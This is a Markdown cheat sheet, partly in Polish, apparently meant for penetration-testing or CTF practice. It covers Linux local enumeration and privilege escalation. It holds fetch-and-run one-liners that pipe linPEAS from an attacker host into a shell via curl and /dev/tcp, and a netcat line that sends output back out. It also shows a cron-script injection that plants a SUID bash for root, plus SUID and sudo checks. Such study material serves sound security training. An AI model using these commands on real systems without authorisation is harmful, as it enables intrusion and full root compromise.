# Local Enumeration

### Enumerationg System Information

```bash
hostname
cat /etc/issue
cat /etc/*release
uname -a
lscpu
df -h
cat /etc/shells
```

### Enumerationg USers and Groups

```bash
whoami
groups
groups root
cat /etc/passwd
who
lastlog
```

### Enumerationg Network Information

```bash
netstat
route
ip a s
cat /etc/networks
cat /etc/hosts
cat /etc/resolv.conf
```

### Enumerating Processes & Cron Jobs

```bash
ps aux
crontab -l
cat /etc/cron*
```
# Automatic Local Enumeration


## $ LinEnum (.sh)

Scripted Local Linux Enumeration & Privilege Escalation Checks
https://github.com/rebootuser/LinEnum

## $ Linux-Exploit-Suggester (.sh)

https://github.com/mzet-/linux-exploit-suggester

## $ linPEAS

Cały projekt https://github.com/carlospolop/PEASS-ng/tree/master  
linpeas.sh : https://github.com/carlospolop/PEASS-ng/releases/tag/20231024-f6adaa47

**Local network**

```bash
sudo python3 -m http.server 80 #Host
curl 10.10.10.10/linpeas.sh | sh #Victim
```

**Without curl**

```bash
sudo nc -q 5 -lvnp 80 < linpeas.sh #Host
cat < /dev/tcp/10.10.10.10/80 | sh #Victim
```

**Excute from memory and send output back to the host**

```bash
nc -lvnp 9002 | tee linpeas.out #Host
curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 9002 #Victim
```


# Privilege Escalation

## $ traitor

Automatically exploit low-hanging fruit to pop a root shell
https://github.com/liamg/traitor
https://github.com/liamg/traitor/releases

## Cron jobs

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

## SUID binaries

```bash
# nadaj SUID plikowi /bin/cp
$ chmod u+s /bin/cp
# znajdź binarki z ustawionym SUID
$ find / -perm -u=s -type f 2>/dev/null
```

## ręcznie

```bash
find / -not -type l -perm -o+w # identify files with the write permission applied for all user accounts
openssl passwd -1 -salt abc password # hash hasła password, salt abc, hash MD5
find / -user root -perm -4000 -exec ls -ldb {} \; # finding setuid program
sudo -l # misconfigured sudo
```

